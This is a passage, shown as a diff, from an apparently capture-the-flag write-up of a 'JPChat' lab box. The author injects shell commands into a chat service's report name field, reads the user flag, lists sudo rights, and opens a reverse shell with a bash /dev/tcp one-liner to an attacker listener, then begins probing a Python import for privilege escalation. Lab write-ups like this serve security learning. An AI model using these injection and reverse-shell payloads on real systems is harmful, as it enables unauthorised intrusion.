@@ -105,3 +105,136 @@ nc -lvnp 1337
 ```
 
 and tried to run the reverse shell, but it didn't seem to work.
+
+After a while I realized that we were injecting python code instead of shell commands. We also needed to end the command, so the end of the line still makes sense, so I decided to first insert normal input then the and operator with the real bash instruction. THEN we could end the command with another echo that logically makes sense for the rest of the source code.
+
+```
+Welcome to JPChat
+the source code of this service can be found at our admin's github
+MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
+REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
+[REPORT]
+this report will be read by Mozzie-jpg
+your name:
+lorenzo && ls && echo test
+your report:
+test
+lorenzo
+bin
+boot
+box_setup
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+vagrant
+var
+vmlinuz
+vmlinuz.old
+```
+This finally worked. I decided to check out the user.txt file.
+
+```
+[REPORT]
+this report will be read by Mozzie-jpg
+your name:
+lorenzo && cat ~/user.txt && echo
+your report:
+test
+lorenzo
+JPC{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
+```
+
+And there we have the first flag. I also checked the commands that we could execute as sudo. But also realized that no matter what result I would find, I would probably need to run some sort of Reverse Shell to successfully escalate privileges. For now I still tried to get those informations out.
+
+```
+[REPORT]
+this report will be read by Mozzie-jpg
+your name:
+lorenzo && sudo -l && echo
+your report:
+test
+lorenzo
+Matching Defaults entries for wes on ubuntu-xenial:
+    mail_badpass, env_keep+=PYTHONPATH
+
+User wes may run the following commands on ubuntu-xenial:
+    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
+```
+
+There seems to be a Python script that we might be able to modify. For now I tried setting up the netcat listener to run a reverse shell.
+
+```
+root@ip-10-10-172-107:~# nc -lvnp 1337
+Listening on 0.0.0.0 1337
+Connection received on 10.10.205.67 44784
+bash: cannot set terminal process group (1308): Inappropriate ioctl for device
+bash: no job control in this shell
+wes@ubuntu-xenial:/$ 
+```
+
+As you can see it worked. That was due to the following command that we injected in the Chat Service
+
+```
+root@ip-10-10-172-107:~# nc 10.10.205.67 3000
+Welcome to JPChat
+the source code of this service can be found at our admin's github
+MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
+REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
+[REPORT]
+this report will be read by Mozzie-jpg
+your name:
+lorenzo && bash -i >& /dev/tcp/10.10.172.107/1337 0>&1 && echo
+your report:
+test
+lorenzo
+```
+
+After finally compromising the machine I used the occasion to check out the python script.
+
+```
+wes@ubuntu-xenial:/$ cat /opt/development/test_module.py
+cat /opt/development/test_module.py
+#!/usr/bin/env python3
+
+from compare import *
+
+print(compare.Str('hello', 'hello', 'hello'))
+```
+
+Interesting. We might be able to modify this file. Let's see if we have write permissions.
+
+```
+wes@ubuntu-xenial:/$ ls -la /opt/development
+ls -la /opt/development
+total 12
+drwxr-xr-x 2 root root 4096 Jan 15  2021 .
+drwxr-xr-x 4 root root 4096 Jan 15  2021 ..
+-rw-r--r-- 1 root root   93 Jan 15  2021 test_module.py
+```
+
+Yikes. Apparently we do not. Alright then. But there was a library that is being imported. Maybe we can use that.
+
+```
+wes@ubuntu-xenial:/$ find / -name 'compare.py' 2>/dev/null
+find / -name 'compare.py' 2>/dev/null
+/usr/lib/python3.5/compare.py
+```
+
+I was thrown out of my session. I need to figure out how to stabilize my sehll, so it doesn't immediately have a seizure once I try to use an editor to modify specific files.
